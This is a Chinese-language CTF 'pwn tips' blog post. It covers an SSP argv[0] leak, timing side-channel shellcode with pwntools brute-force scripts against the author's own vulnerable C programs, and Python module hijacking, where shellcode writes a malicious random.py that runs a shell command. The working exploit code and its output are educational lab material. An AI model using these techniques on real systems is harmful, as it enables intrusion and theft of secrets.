---
title: "pwn-tips"
draft: false
date: 2026-03-09
summary: "一些小技巧"
tags: ["pwn"]
---

<!--more-->


## ssp leak
覆盖__start栈帧的argv[0], 然后直接触发__stack_chk_fail
```
void __attribute__ ((noreturn)) __stack_chk_fail (void) 
{  
    __fortify_fail ("stack smashing detected"); 
} 
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg) 
{  
    /* The loop is added only to keep gcc happy. */ 
    while (1)   
        __libc_message (2, "*** %s ***: %s terminated\n",             
                        msg, __libc_argv[0] ?: "<unknown>"); //这里覆盖就可以泄露
}
```

## side-channel

闲来无事，复习一下好久没遇到过的`侧信道pwn`

基本的打法有时间侧信道，要基于下面这个shellcode，如果匹配正确会循环，如果匹配失败会报错，我们通过这种回显进行侧信道爆破。

```
shellcode = '''
    xor byte ptr [rdi+{}],{}
    jz $
'''
```

我的想法使自己写两道题，一道题开沙箱只允许read、open；另一道题只读取8字节的输入。

**`自己给自己出题发现一个很有意思的事情，就是不能用scanf读取，因为我们遍历flag的时候遇到第十个字符的时候"\x10"会被解析成\n而被scanf截断。`**

```
┌──(kali㉿kali)-[~/Desktop/cha]
└─$ python3 sdc1
b'\x80w\n_t\xfe'
$
```

```
┌──(kali㉿kali)-[~/Desktop/cha]
└─$ cat side-channel.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <time.h>
#include <unistd.h>
#include <seccomp.h>
#include <sys/mman.h>
#include <fcntl.h>      // For open() and O_RDONLY
#include <sys/types.h>  // For system data types
#include <sys/stat.h>   // For file status flags

void init(){
    size_t size = 0x200; 
    size_t size1 = 0x10;
    mmap((void *)0x114514, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    mmap((void *)0x12345, size1, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    setvbuf(stderr, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    if (mprotect((void *)0x12000, size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        perror("mprotect failed");
        exit(1);}
}
void readflag(){
    int fd;
    fd = open("./flag",O_RDONLY);
    read(fd,(void *)0x114514,0x30);
}
void vuln(){
    printf("Ok, let's begin.\n");
    read(0,(void *)0x12345,0x8);    
    void (*func)() = (void (*)())0x12345;
    func((void *)0x114514);
}
int main(){
    init();
    readflag();
    vuln();
}
                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/cha]
└─$ python3 sdc
6
f
fl
fla
flag
flag{
flag{T
flag{Th
flag{Thi
flag{This
flag{This_
flag{This_i
flag{This_is
flag{This_is_
flag{This_is_a
flag{This_is_a_
flag{This_is_a_T
flag{This_is_a_Te
flag{This_is_a_Tes
flag{This_is_a_Test
flag{This_is_a_Test1
flag{This_is_a_Test11
flag{This_is_a_Test111
flag{This_is_a_Test111!
flag{This_is_a_Test111!!
flag{This_is_a_Test111!!!
flag{This_is_a_Test111!!!}
flag{This_is_a_Test111!!!}}

┌──(kali㉿kali)-[~/Desktop/cha]
└─$ cat sdc           
from pwn import *
context(os='linux',arch='amd64',log_level='fatal')

shellcode = '''
    xor byte ptr [rdi+{}],{}
    jz $
'''
print(len(asm(shellcode.format(10,80))))
#b'\x80w\x01\x02t\xfe'

flag = ""
idx = 0
k = string.printable
p = [ord(x) for x in k]
while True:
    for i in p:
        g = True
        try:
            io = process('./side-channel')
            io.sendlineafter(b'begin.\n',asm(shellcode.format(idx,i)))
            #io.sendlineafter(b'begin.\n',b'\x80w'+p8(idx)+p8(i)+b't\xfe')
            m = io.can_recv(timeout=2)
            io.close()
            if not m:
                flag += chr(i)
                print(flag)
                idx += 1
                if chr(i)=="}":
                    print(flag+chr(i))
                    io.close()
            if m:
                continue
        except EOFError:
            io.close()
```

同理，orw的打法也大同小异。

```
┌──(kali㉿kali)-[~/Desktop/cha]
└─$ cat side-channel1.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <time.h>
#include <unistd.h>
#include <seccomp.h>
#include <sys/mman.h>
#include <fcntl.h>      // For open() and O_RDONLY
#include <sys/types.h>  // For system data types
#include <sys/stat.h>   // For file status flags

void
init(){
    size_t size = 0x200; 
    size_t size1 = 0x10;
    mmap((void *)0x114514, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    setvbuf(stderr, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    if (mprotect((void *)0x114000, size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        perror("mprotect failed");
        exit(1);}
}
void
sandbox(){
    scmp_filter_ctx ctx;

    ctx = seccomp_init(SCMP_ACT_KILL);
    if (ctx == NULL) {
        perror("seccomp_init");
        exit(1);
    }

    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) < 0) {
        perror("seccomp_rule_add read");
        seccomp_release(ctx);
        exit(1);
    }

    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) < 0) {
        perror("seccomp_rule_add open");
        seccomp_release(ctx);
        exit(1);
    }
    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) < 0) {
        perror("seccomp_rule_add openat");
        seccomp_release(ctx);
        exit(1);
    }

    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    if (seccomp_load(ctx) < 0) {
        perror("seccomp_load");
        seccomp_release(ctx);
        exit(1);
    }

    seccomp_release(ctx);}

void vuln(){
    read(0,(void *)0x114514,0x100);     
    void (*func)() = (void (*)())0x114514;
    func();
}
int
main(){
    init();
    sandbox();
    vuln();
}

┌──(kali㉿kali)-[~/Desktop/cha]
└─$ cat sdc1           
from pwn import *
context(os='linux',arch='amd64',log_level='fatal')
shellcode = '''
    xor rax,rax
    add rax,2
    xor rsi,rsi
    mov rdi,0x67616c662f2e
    push rdi
    mov rdi,rsp
    syscall
    mov rdi,rax
    xor rax,rax
    mov rsi,0x114614
    mov rdx,0x30
    syscall
    mov rdi,rsi
    xor byte ptr [rdi+{}],{}
    jz $
'''
flag = ""
idx = 0
k = string.printable
p = [ord(x) for x in k]
while True:
    for i in p:
        g = True
        try:
            io = process('./side-channel1')
            io.send(asm(shellcode.format(idx,i)))
            m = io.can_recv(timeout=2)
            io.close()
            if not m:
                flag += chr(i)
                print(flag)
                idx += 1
                if chr(i)=="}":
                    print(flag+chr(i))
                    io.close()
            if m:
                sleep(0.1)
                continue
        except EOFError:
            io.close()
```



## Python module Hijacking

这是一种针对于python的打法，笔者是在Actf2025看到有一个队这么偷菜的，因此这里记录并且复现一下，`它的原理是python在import库的时候会先解析当前文件夹同名的文件作为库文件`，因此我们可以用shellcode创建一个里面放满我们的恶意代码。

要实现这种打法，首先要有个python代码写的wrapper，笔者将会自己写一个类似的并且通过复现打法实现getshell。

```
┌──(root㉿kali)-[/home/kali/Desktop/cha]
└─# cat vuln.c        
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>      // For open() and O_RDONLY
#include <sys/types.h>  // For system data types
#include <sys/stat.h>   // For file status flags

int
main(){
    int fd;
    int size = 0x200;
    fd = open("shellcode.bin",0);
    mmap((void *)0x1234567, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    // Set RWX permissions on the buffer
    if (mprotect((void *)0x1234000, size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        perror("mprotect failed");
        exit(1);
    }
    read(fd,(void *)0x1234567,0x200);
    void (*func)() = (void (*)())0x1234567;
    func();
}
                                                                                                                         
┌──(root㉿kali)-[/home/kali/Desktop/cha]
└─# cat wrapper.py
#!/usr/bin/python3
import os
import random
import string
import signal
import pathlib
import sys
def recv_shellcode() -> bytes:
    result = b""
    try:
        while True:
            print("> ", flush=True)
            line_content = input().strip()
            if not line_content:
                break
            result += bytes.fromhex(line_content)
    except Exception as err:
        print("Bad input format", flush=True)
        exit(-1)

    print(f"receive in total {len(result)} bytes, move on ...")
    return result

shellcode = recv_shellcode()
output_file = "./shellcode.bin" 
k = random.choice(string.hexdigits)
print(shellcode)
with open(output_file, "wb") as f:
    f.write(shellcode)
os.system("./vuln")
```

经过本地测试，**`只有以root权限连接才能实现，因为linux的权限管理极其严格导致非root权限生成的库无可执行权限`**。

```
┌──(root㉿kali)-[/home/kali/Desktop/cha]
└─# python3 exp       
[+] Starting local process './wrapper.py': pid 19309
148
/home/kali/Desktop/cha/exp:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline(asm(sc).hex()+b'#'.hex()*0x10)
[*] Switching to interactive mode
> 
> 
receive in total 164 bytes, move on ...
b"jyH\xb8random.pPH\x89\xe71\xd2jB^j\x02X\x0f\x05H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8`f&(\x0b\x01\x01\x01H1\x04$H\xb8cat ./flPH\xb8system('PH\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8u!nr\x0bnr/H1\x04$H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8xr\x0bhlqnsH1\x04$H\xb8import sPH\x89\xe6j\x04_j-Zj\x01X\x0f\x05################"
Segmentation fault (core dumped)
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Process './wrapper.py' stopped with exit code 0 (pid 19309)
                                                                                                                         
┌──(root㉿kali)-[/home/kali/Desktop/cha]
└─# python3 exp
flag{This_is_a_Test111!!!}
Traceback (most recent call last):
  File "/home/kali/Desktop/cha/exp", line 1, in <module>
    from pwn import *
  File "/usr/lib/python3/dist-packages/pwn/__init__.py", line 4, in <module>
    from pwn.toplevel import *
  File "/usr/lib/python3/dist-packages/pwn/toplevel.py", line 15, in <module>
    import tempfile
  File "/usr/lib/python3.12/tempfile.py", line 184, in <module>
    from random import Random as _Random
ImportError: cannot import name 'Random' from 'random' (/home/kali/Desktop/cha/random.py)

┌──(root㉿kali)-[/home/kali/Desktop/cha]
└─# cat exp       
from pwn import *
io = process('./wrapper.py')
context(os='linux',arch='amd64')
fake_module = '''import sys
import os
os.system('cat ./flag')
'''
sc = shellcraft.amd64.open("random.py",66) #2(READ_ONLY)|64(CREATE) = 66
sc += shellcraft.amd64.write(4,fake_module,len(fake_module))
print(len(asm(sc)))
io.sendline(asm(sc).hex()+b'#'.hex()*0x10)
io.sendline()
io.interactive()
```

